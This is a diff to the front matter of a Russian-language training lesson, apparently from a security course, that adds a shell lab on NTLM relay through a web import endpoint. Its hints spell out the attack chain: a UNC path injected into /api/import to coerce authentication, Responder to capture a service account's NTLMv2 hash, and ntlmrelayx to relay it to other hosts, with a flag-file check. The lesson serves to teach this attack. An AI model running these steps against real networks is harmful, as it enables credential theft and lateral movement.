@@ -13,6 +13,18 @@ useful_for:
   - "Bug bounty (внутренние)"
 estimated_minutes: 42
 summary: "Как веб-уязвимость заставляет сервер аутентифицироваться по NTLM и релеит креды на другие хосты: Responder, WebDAV, coercion."
+lab:
+  kind: shell
+  title: "Практика: NTLM relay из веб-импорта"
+  toolset: [core, curl, responder, ntlmrelayx]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Windows автоматически аутентифицируется при обращении к `\\\\host\\share`."
+    - "Подставь UNC на свой хост в `/api/import` — сервер «постучится» к тебе."
+    - "Запусти `responder -I eth0 -v`, чтобы поймать NTLMv2-хэш сервисной учётки."
+    - "Релей на соседний хост: `ntlmrelayx -tf targets.txt -smb2support` — в дампе флаг. Запиши в `found.txt` и `check`."
 ---
 
 ## Вопрос, с которого всё начинается
